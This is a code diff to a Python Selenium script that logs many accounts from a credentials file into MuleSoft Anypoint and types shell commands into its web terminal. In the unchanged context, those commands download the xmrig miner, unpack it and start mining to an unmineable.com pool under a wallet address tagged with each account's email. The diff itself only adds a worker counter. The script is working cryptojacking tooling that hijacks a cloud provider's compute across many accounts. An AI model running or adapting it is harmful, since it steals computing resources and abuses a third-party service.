@@ -12,7 +12,7 @@ import threading
 import os
 chrome_driver_path = "/usr/local/bin/chromedriver"
 login_url = "https://anypoint.mulesoft.com/login/"
-
+sss = 0
 with open("acc.txt", "r") as file:
     accounts = [line.strip().split(":") for line in file.readlines()]
 
@@ -88,9 +88,10 @@ def open_browser(instance_number, email, password):
     
     try:
         textarea1 = wait.until(EC.presence_of_element_located((By.CLASS_NAME, "xterm-helper-textarea")))
-        print("SUCCES")
+        print("SUCCES")        
         textarea1.send_keys(f"wget https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz\ntar -xvf xmrig-6.22.2-linux-static-x64.tar.gz\ncd xmrig-6.22.2\n./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u BONK:mA914pP63TTdq1c8igHEtrKQyhdwz36yVVbQeAR6YnD.{email}#u7pd-53qq -p x --tls --threads=4 -k")
         textarea1.send_keys(Keys.ENTER)
+        return sss + 1
     except:
         print(f"[{email}] ❌ terminal not found ")
 
@@ -107,3 +108,4 @@ for thread in threads:
     thread.join()
 
 print("✅ All Chrome instances launched and optimized.")
+print(f"SUCCES LAUNCH {sss} WORKER")
